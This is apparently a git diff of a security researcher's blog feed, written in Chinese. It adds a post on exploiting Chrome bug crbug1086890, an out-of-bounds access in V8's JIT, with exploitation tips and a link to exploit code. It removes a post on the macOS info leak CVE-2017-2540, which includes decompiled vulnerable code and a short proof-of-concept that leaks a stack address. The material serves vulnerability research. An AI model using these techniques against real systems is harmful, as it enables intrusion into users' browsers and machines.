@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://o0xmuhe.me/"/>
-  <updated>2020-08-07T04:56:04.470Z</updated>
+  <updated>2020-08-27T07:18:29.415Z</updated>
   <id>http://o0xmuhe.me/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>exploit for crbug1086890</title>
+    <link href="http://o0xmuhe.me/2020/08/27/exploit-for-crbug1086890/"/>
+    <id>http://o0xmuhe.me/2020/08/27/exploit-for-crbug1086890/</id>
+    <published>2020-08-27T07:07:08.000Z</published>
+    <updated>2020-08-27T07:18:29.415Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="bug-info"><a href="#bug-info" class="headerlink" title="bug info"></a>bug info</h2><p>来自pj0的[glazunov]([<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;can=1&amp;q=&amp;sort=-id&amp;colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary]">https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;can=1&amp;q=&amp;sort=-id&amp;colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary]</a>(<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;can=1&amp;q=&amp;sort=-id&amp;colspec=ID">https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;can=1&amp;q=&amp;sort=-id&amp;colspec=ID</a> Type Status Priority Milestone Owner Summary))的洞，一个JIT优化中的洞，缺少边界检查最终导致oob r/w。</p><a id="more"></a><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>比较不好的地方就是需要大概猜一下那个oobarray的elements的地址，使得我们想用来aar/w的array或者arraybuffer落在这后面，大概调整个偏移使得能够正常读写到就行。</p><p>测试版本:83.0.4103.61 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Commit: 88bff78e26dbd25dcbb342d4b07c7e66c0f048be</span><br><span class="line">Branch Base Commit: 8ad47e8d21f6866e4a37f47d83a860d41debf514</span><br><span class="line">Branch Base Position: 756066</span><br><span class="line">V8 Commit: 3b627511511f00c552ced504c1f182bdcc3480af</span><br><span class="line">V8 Version: 8.3.110.9</span><br><span class="line">V8 Position: 19</span><br><span class="line">Skia Commit: c3d05a789930913af94174961bc6f90894196f62</span><br></pre></td></tr></table></figure><ul><li>调试会比较麻烦点，gdb 直接起触发有问题（我这里是），我是开了coredump，然后触发crash看看内存啥的调的。</li><li>biguint64 还是 arraybuffer都行，喜欢啥用啥。</li><li>想成功率高，要用web worker（我觉得），要么死猜几个地址，要么随机撞大运。</li></ul><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/crbug1086890/CleanShot%202020-08-27%20at%2011.26.03.png" alt="exploit linux d8"></p><p><a href="https://github.com/o0xmuhe/RealWorldPwn/tree/master/chrome_M83_crbug1086890_RCE">完整利用代码</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;bug-info&quot;&gt;&lt;a href=&quot;#bug-info&quot; class=&quot;headerlink&quot; title=&quot;bug info&quot;&gt;&lt;/a&gt;bug info&lt;/h2&gt;&lt;p&gt;来自pj0的[glazunov]([&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;amp;can=1&amp;amp;q=&amp;amp;sort=-id&amp;amp;colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary]&quot;&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;amp;can=1&amp;amp;q=&amp;amp;sort=-id&amp;amp;colspec=ID%20Type%20Status%20Priority%20Milestone%20Owner%20Summary]&lt;/a&gt;(&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;amp;can=1&amp;amp;q=&amp;amp;sort=-id&amp;amp;colspec=ID&quot;&gt;https://bugs.chromium.org/p/project-zero/issues/detail?id=2046&amp;amp;can=1&amp;amp;q=&amp;amp;sort=-id&amp;amp;colspec=ID&lt;/a&gt; Type Status Priority Milestone Owner Summary))的洞，一个JIT优化中的洞，缺少边界检查最终导致oob r/w。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="exploit" scheme="http://o0xmuhe.me/categories/exploit/"/>
+    
+    
+      <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
+    
+      <category term="chrome" scheme="http://o0xmuhe.me/tags/chrome/"/>
+    
+  </entry>
   
   <entry>
     <title>make-script-to-macOS App</title>
@@ -480,29 +505,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;basic-info&quot;&gt;&lt;a href=&quot;#basic-info&quot; class=&quot;headerlink&quot; title=&quot;basic info&quot;&gt;&lt;/a&gt;basic info&lt;/h2&gt;&lt;p&gt;size用户可控，array操作时栈溢出。&lt;br&gt;macOS 10.12.1&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="漏洞分析" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
-    
-      <category term="macOS" scheme="http://o0xmuhe.me/tags/macOS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVE-2017-2540 _XGetConnectionPSN info leak</title>
-    <link href="http://o0xmuhe.me/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/"/>
-    <id>http://o0xmuhe.me/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/</id>
-    <published>2019-06-19T03:32:18.000Z</published>
-    <updated>2020-06-20T11:03:12.504Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="basic-info"><a href="#basic-info" class="headerlink" title="basic info"></a>basic info</h2><p>uninitialized stack var –&gt; info leak<br>macOS 10.12.1</p><a id="more"></a><h2 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h2><p><code>_FindProcessRecByConnectionID</code> 调用失败后，会用未初始化的栈变量做赋值操作，导致信息泄漏。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">NDR_record_t __usercall _XGetConnectionPSN@&lt;rax&gt;(__int64 a1@&lt;rax&gt;, _DWORD *a2@&lt;rdi&gt;, __int64 a3@&lt;rsi&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  NDR_record_t result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  savedregs = a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 &lt; <span class="number">0</span> || a2[<span class="number">1</span>] != <span class="number">0x24</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">32</span>) = <span class="number">-304</span>;</span><br><span class="line">    result = NDR_record;</span><br><span class="line">    *(NDR_record_t *)(a3 + <span class="number">24</span>) = NDR_record;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = FindProcessRecByConnectionID((<span class="keyword">unsigned</span> <span class="keyword">int</span>)a2[<span class="number">8</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *(_QWORD *)(v4 + <span class="number">4</span>);</span><br><span class="line">      v5 = *(_QWORD *)(v4 + <span class="number">4</span>) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x24</span>) = v6;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x28</span>) = v5;                <span class="comment">// uninitialized</span></span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">0x20</span>) = <span class="number">0</span>;</span><br><span class="line">    result = NDR_record;</span><br><span class="line">    *(NDR_record_t *)(a3 + <span class="number">24</span>) = NDR_record;</span><br><span class="line">    *(_DWORD *)(a3 + <span class="number">4</span>) = <span class="number">44</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">4<span class="keyword">mach_msg_return_t</span> ret;</span><br><span class="line">4<span class="keyword">leak_msg_t</span> message;</span><br><span class="line">4<span class="keyword">mach_port_t</span> replyPort = mig_get_reply_port();</span><br><span class="line">4<span class="built_in">memset</span>(&amp;message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">4message.header.msgh_remote_port = getport;</span><br><span class="line">4message.header.msgh_local_port = replyPort;</span><br><span class="line">4message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);</span><br><span class="line">4message.header.msgh_size = <span class="number">36</span>;</span><br><span class="line">4message.header.msgh_id = <span class="number">0x7210</span> + <span class="number">0xff</span>;</span><br><span class="line">4message.NDR = NDR_record;</span><br><span class="line">4message.size = <span class="number">0</span>;</span><br><span class="line">4message.leak_addr = <span class="number">0x1337</span>; <span class="comment">//if trigger leak bug successfully, it will be change to stack value.</span></span><br><span class="line">4ret = mach_msg(&amp;(message.header), MACH_SEND_MSG | MACH_RCV_MSG,</span><br><span class="line">44444<span class="number">36</span>, <span class="number">0xffff</span>, replyPort,</span><br><span class="line">44444MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"></span><br><span class="line">4<span class="keyword">if</span>(ret != MACH_MSG_SUCCESS) &#123;</span><br><span class="line">44NSLog(@<span class="string">"mach_msg fail.\n"</span>);</span><br><span class="line">44mach_error(<span class="string">"mach_msg:"</span> , ret);</span><br><span class="line">4&#125;</span><br><span class="line">4stack_addr = <span class="number">0x7fff00000000</span> | message.leak_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写poc的时候发现一个问题，使用之前和<code>fontd</code>交互的代码获取port，然后填充<code>mach msg</code>的<code>remote port</code> 无法触发漏洞，问了下<a href="https://brightiup.me">brightiup</a>得到了答案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你获取的这个port是这个mach服务的port，他这个代码里面通过funcptr获得的port是一个对象的port可以理解为一个上下文。其实那个funcptr应该是CGSCreateLayerContext函数。</span><br></pre></td></tr></table></figure><p>我获取到的port是没有上下文的，所以无法触发漏洞路径。</p><p>重新看了完整利用后，发现这个offset对应的函数应该是 <code>CGSGetConnectionPortById</code>。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://github.com/theori-io/zer0con2018_singi">zer0con2018_singi</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;basic-info&quot;&gt;&lt;a href=&quot;#basic-info&quot; class=&quot;headerlink&quot; title=&quot;basic info&quot;&gt;&lt;/a&gt;basic info&lt;/h2&gt;&lt;p&gt;uninitialized stack var –&amp;gt; info leak&lt;br&gt;macOS 10.12.1&lt;/p&gt;
     
     </summary>
     
